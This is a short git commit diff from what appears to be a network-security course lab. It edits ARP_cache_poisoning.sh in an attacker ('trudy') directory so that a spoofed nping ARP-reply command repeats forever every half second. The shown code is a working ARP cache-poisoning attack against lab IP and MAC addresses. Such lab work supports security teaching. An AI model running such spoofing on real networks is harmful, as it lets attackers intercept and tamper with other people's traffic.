0952c0f9e3cd2c8267d6bad9eb283706ab6628fd
anshul sangrame <anshul.sangrame@gmail.com>
2024-04-11 08:11:36 +0000

    pcap-arp

--- assgn7/trudy1/task5/ARP_cache_poisoning.sh
+++ assgn7/trudy1/task5/ARP_cache_poisoning.sh
@@ -1,3 +1,5 @@
+while :
+do
 # Define target IP and MAC addresses
 alice_target_ip="172.31.0.2"
 alice_target_mac="00:16:3e:3d:17:94"
@@ -12,7 +14,8 @@ bob_target_mac="00:16:3e:3d:17:94"
 
 # Construct the command to send ARP packet
 nping --dest-ip $bob_target_ip --arp --arp-type arp-reply --source-ip $bob_target_ip --source-mac $bob_target_mac -c 1
-
+sleep 0.5
+done
 # Define target IP and MAC addresses
 
 # out_target_ip="172.31.0.1"
